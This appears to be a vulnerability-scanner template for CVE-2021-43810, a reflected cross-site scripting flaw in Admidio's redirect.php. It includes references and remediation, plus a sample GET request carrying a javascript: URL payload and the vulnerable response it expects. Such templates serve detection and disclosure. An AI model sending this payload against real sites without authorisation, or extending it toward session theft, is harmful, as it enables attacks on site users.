id: CVE-2021-43810
info:
  name: Admidio - Cross-Site Scripting
  author: gy741
  description: A cross-site scripting vulnerability is present in Admidio prior to
    version 4.0.12. The reflected cross-site scripting vulnerability occurs because
    redirect.php does not properly validate the value of the url parameter. Through
    this vulnerability, an attacker is capable to execute malicious scripts.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: Upgrade to version 4.0.12 or later.
  reference:
  - https://github.com/Admidio/admidio/security/advisories/GHSA-3qgf-qgc3-42hh
  - https://nvd.nist.gov/vuln/detail/CVE-2021-43810
  - https://github.com/Admidio/admidio/commit/fcb0609abc1d2f65bc1377866bd678e5d891404b
  - https://github.com/Admidio/admidio/commit/c043267d362f7813543cc2785119bf3e3e54fe21
  - https://github.com/Admidio/admidio/releases/tag/v4.0.12
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-43810
    cwe-id: CWE-79
    epss-score: 0.00369
    epss-percentile: 0.72044
    cpe: cpe:2.3:a:admidio:admidio:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: admidio
    product: admidio
  tags: cve2021,cve,admidio,xss
traps:
- request:
    method: GET
    path: /adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: please click <a href="javascript://%0aalert(document.domain)" target="_self">
